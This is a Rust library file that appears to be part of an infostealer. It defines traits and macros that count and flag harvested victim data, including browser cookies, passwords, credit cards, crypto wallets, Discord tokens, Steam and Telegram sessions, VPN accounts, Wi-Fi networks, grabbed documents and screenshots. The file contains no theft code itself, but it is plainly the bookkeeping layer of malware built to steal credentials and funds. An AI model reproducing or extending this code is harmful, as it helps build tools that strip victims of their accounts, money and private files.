#![no_std]

extern crate alloc;

use alloc::format;
use alloc::vec::Vec;
pub mod atomic;
pub mod display;

macro_rules! increase_count {
    ($name:ident) => {
        paste::paste! {
            fn [<increase_ $name _by>](&self, count: usize);

            fn [<increase_ $name>](&self) {
                self.[<increase_ $name _by>](1);
            }

            fn [<get_ $name>](&self) -> usize;
        }
    };
}

macro_rules! flag {
    ($name:ident) => {
        paste::paste! {
            fn [<set_ $name>](&self);

            fn [<is_ $name>](&self) -> bool;
        }
    };

    ($name:ident, $ty:ty) => {
        paste::paste! {
            fn [<set_ $name>](&self, val: $ty);

            fn [<get_ $name>](&self) -> Option<$ty>;
        }
    };
}

pub trait Browser: Send + Sync {
    increase_count!(cookies);
    increase_count!(passwords);
    increase_count!(credit_cards);
    increase_count!(auto_fills);
    increase_count!(history);
    increase_count!(bookmarks);
    increase_count!(downloads);
}

pub trait Software: Send + Sync {
    increase_count!(wallets);
    increase_count!(ftp_hosts);
    flag!(telegram);
    increase_count!(discord_tokens);
    increase_count!(steam_session);
}

pub trait FileGrabber: Send + Sync {
    increase_count!(source_code_files);
    increase_count!(database_files);
    increase_count!(documents);
}

pub trait Vpn: Send + Sync {
    increase_count!(accounts);
}

pub trait Device: Send + Sync {
    increase_count!(wifi_networks);
    flag!(screenshot, Vec<u8>);
}

pub trait Collector: Send + Sync {
    type Browser: Browser;
    type Software: Software;
    type FileGrabber: FileGrabber;
    type Vpn: Vpn;
    type Device: Device;

    fn get_browser(&self) -> &Self::Browser;

    fn get_software(&self) -> &Self::Software;

    fn get_file_grabber(&self) -> &Self::FileGrabber;

    fn get_vpn(&self) -> &Self::Vpn;

    fn get_device(&self) -> &Self::Device;
}
